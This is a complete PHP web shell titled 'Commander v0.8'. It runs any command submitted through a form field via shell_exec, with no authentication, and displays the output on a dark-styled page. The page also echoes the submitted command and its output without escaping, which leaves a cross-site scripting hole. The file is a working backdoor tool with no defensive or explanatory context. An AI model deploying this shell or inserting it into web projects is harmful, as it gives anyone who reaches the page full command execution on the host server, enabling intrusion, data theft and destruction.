<?php
    $cmd = "";
    $ret = "";
    if(isset($_POST['cmd'])){
        $cmd = $_POST['cmd'];
        $ret = shell_exec($cmd);
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Commander v0.8</title>

    <style>
        body{
            background-color: #151515;
        }
        .result{
            display: block;
            height: 400px;
            background-color: #222;
            color: #99f;
            font-size: 20px;
            padding: 20px;
            margin-bottom: 20px;        
            overflow: auto;
        }
        .prompt input[type="text"]{
            width: 500px;
            background-color: transparent;
            color: yellow;
            border: 1px solid darkslateblue;
            font-size: 20px;
            line-height: 35px;
            padding: 5px 10px;
            letter-spacing: 2px;
            margin-bottom: 10px;
        }
        .prompt input[type="submit"]{
            background-color: #999;
            border: 1px solid gray;
            line-height: 32px;
            width: 145px;
            font-size: 20px;
            font-weight: bold;
            color: #333;
            padding: 7px;
        }
    </style>
</head>
<body>
    <div class="result"><pre><?= $ret ?></pre></div>
    <form action="" class="prompt" method="post">
        <input type="text" name="cmd" autofocus value="<?= $cmd ?>"/>
        <input type="submit" value="Execute" />
    </form>
</body>
</html>
